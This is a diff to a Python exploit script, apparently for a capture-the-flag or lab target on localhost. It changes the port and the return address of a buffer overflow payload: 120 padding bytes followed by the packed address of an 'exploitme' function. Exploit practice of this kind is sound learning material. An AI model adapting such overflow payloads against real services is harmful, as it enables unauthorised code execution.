@@ -2,14 +2,14 @@ from telnetlib import Telnet
 import struct
 
 RHOST = "localhost"
-RPORT = 1337
+RPORT = 1002
 
 ATTACK_REMOTE = True
 
 # Offset found using EDB and the pattern.py script
 OFFSET = 120
 # Target address for exploitme function was found using objdump
-TARGET_ADDRESS_INT = '0x000000000040126f'
+TARGET_ADDRESS_INT = '0x000000000040125f'
 payload_prefix = b"test\n"
 payload = b"A"*OFFSET + struct.pack('<Q', int(TARGET_ADDRESS_INT, base=16))
 
